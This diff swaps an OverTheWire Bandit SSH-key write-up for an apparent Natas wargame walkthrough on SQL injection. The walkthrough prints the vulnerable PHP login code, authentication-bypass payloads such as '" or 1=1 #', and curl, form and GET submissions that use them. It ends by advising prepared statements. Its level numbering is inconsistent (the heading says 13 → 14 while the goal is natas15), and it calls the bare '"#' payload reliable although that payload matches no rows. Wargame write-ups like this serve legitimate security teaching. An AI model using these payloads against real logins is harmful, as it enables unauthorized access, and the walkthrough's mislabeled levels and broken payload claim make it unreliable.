@@ -1,100 +1,117 @@
-# OverTheWire Bandit: Level 13 → Level 14
+# Natas Level 13 → Level 14
 
-## Challenge Description
+**Goal:** Find the password for natas15. This level has a login form that's vulnerable to `SQL injection` because user input is concatenated directly into a SQL query without sanitization.
 
-> The password for the next level is stored in `/etc/bandit_pass/bandit14` and
-> can only be read by user `bandit14`. For this level, you don't get the next
-> password, but you get a private SSH key that can be used to log into the next
-> level.
+### Step 1: Access the level
 
-> Note: `localhost` is a hostname that refers to the machine you are working on.
+http://natas14.natas.labs.overthewire.org
 
-**Goal:** Use the provided private SSH key to log in as `bandit14`, then read
-the password file that only `bandit14` can access.
+Username: natas14
+Password: (from previous level)
 
-**Connection:**
+### Step 2: Read the page
 
-    ssh bandit13@bandit.labs.overthewire.org -p 2220
+The page shows a simple login form asking for a username and password.
 
-## Concepts Involved
+### Step 3: View the PHP source code
 
-- **SSH key-based authentication**: instead of a password, the client proves its
-  identity with a private key whose matching public key is trusted by the server.
-- **`ssh -i`**: selects the identity (private key) file to use for login.
-- **`localhost`**: the machine you are currently on. Here, the Bandit server connects to itself.
-- **File permissions**: only `bandit14` can read `/etc/bandit_pass/bandit14`,
-  so we must become that user.
+Go to:
 
-## Solution
+http://natas14.natas.labs.overthewire.org/index-source.html
 
-### Step 1: Look around the home directory
+You'll see logic like:
+
+```php
+<?
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas14', '<censored>');
+    mysql_select_db('natas14', $link);
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Query: $query\n";
+    }
+
+    $res = mysql_query($query, $link);
+    if ($res) {
+        if (mysql_num_rows($res) > 0) {
+            echo "Successful login! The password for natas15 is <censored>";
+        } else {
+            echo "Access denied!";
+        }
+    } else {
+        echo "Error in query.";
+    }
+}
+?>
+```
+
+*Key problem:* the username and password values from the request are inserted directly into the SQL query string using double quotes, with no escaping or parameterization, `classic SQL injection`.
+
+### Step 4: Craft an SQL injection payload
+
+Since the query looks like:
+
+```sql
+SELECT * from users where username="<username>" and password="<password>"
+``` 
+
+We can break out of the username field's quotes and comment out the rest of the query (including the password check) using " to close the string and # (or --) to comment out everything after:
+
+username: " or "1"="1
+password: (anything, or leave blank)
+
+This turns the query into:
+
+```sql
+SELECT * from users where username="" or "1"="1" and password="..."
+```
+
+A cleaner, more reliable payload comments out the password check entirely:
+
+username: "#
+
+or
+
+username: " or 1=1 #
+
+This produces:
+
+```sql
+SELECT * from users where username="" or 1=1 #" and password="..."
+```
+
+Everything after `#` is treated as a comment, so the password check is bypassed, and `1=1` makes the condition always true, returning all rows.
+
+### Step 5: Submit the payload
+
+- Using curl:
 
 ```bash
-    bandit13@bandit:~$ ls
-    sshkey.private
-```
-The home directory contains a private key, which belongs to `bandit14`.
-
-### Step 2: Confirm the file type (optional)
-```bash 
-
-    bandit13@bandit:~$ head -n 1 sshkey.private
-    -----BEGIN RSA PRIVATE KEY-----
+curl -u natas14:<password_from_level14> \
+  --data-urlencode 'username=" or 1=1 #' \
+  --data-urlencode 'password=anything' \
+  http://natas14.natas.labs.overthewire.org/index.php
 ```
 
-### Step 3: Log in as bandit14 using the key
+- Or via the browser form directly, type into the username field:
 
-Since we are already on the Bandit server, we connect to `localhost` on the
-same SSH port (2220):
+" or 1=1 #
 
-   ` bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost -p 2220`
+and submit (password field can be left blank or filled with anything).
 
-On the first connection, SSH asks to confirm the host fingerprint:
+- Or via URL (GET):
 
-```bash
-    The authenticity of host '[localhost]:2220 ...' can't be established.
-    Are you sure you want to continue connecting (yes/no)? yes
-```
-After typing `yes`, we are logged in as `bandit14`:
+http://natas14.natas.labs.overthewire.org/index.php?username=%22%20or%201=1%20%23&password=x
 
-    bandit14@bandit:~$
+### Step 6: Get the password
 
-### Step 4: Read the password file
-```bash
+The response will show:
 
-    bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
-    <Natas14_password>
-```
-This works because we are now `bandit14`, the only user allowed to read this file.
+Successful login! The password for natas15 is <XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX>
 
+(Tip: add `&debug` to the URL to see the exact query being constructed, useful for understanding/debugging your payload.)
 
-## Alternative: Using the key from your own machine
+*Lesson learned*
 
-You can also copy the key to your local computer and log in directly.
-```bash
-
-    # Copy the key (run on your local machine)
-    scp -P 2220 bandit13@bandit.labs.overthewire.org:sshkey.private .
-
-    # SSH requires strict permissions on private keys
-    chmod 600 sshkey.private
-
-    # Log in
-    ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220
-```
-
-## Troubleshooting
-
-|                     Problem                          |                             Cause / Fix                                     |
-
-| `Permissions 0644 for 'sshkey.private' are too open` | Run `chmod 600 sshkey.private`. SSH refuses keys readable by others.        |
-| `Connection refused` on localhost                    | Make sure to add `-p 2220`, since the default port 22 is not used.          |
-| Password prompt appears                              | The key was not accepted. Check the filename and the username (`bandit14`). |
-
-## Key Takeaways
-
-- A private key can replace a password for authentication. Anyone holding it can
-  log in as that user, so private keys must be protected carefully.
-- Always use `-p 2220` for Bandit, including when connecting to `localhost`.
-- Private key files must have restrictive permissions (`600`) or SSH will refuse them.
-- Access to a restricted file is gained by becoming the user who owns it.
+Concatenating user input directly into SQL queries allows attackers to manipulate the query's logic entirely bypassing authentication, extracting data, or worse. The fix is to always use `parameterized queries / prepared statements` (e.g., PDO with bound parameters in PHP) instead of string concatenation, so user input is always treated as data, never as part of the SQL syntax.
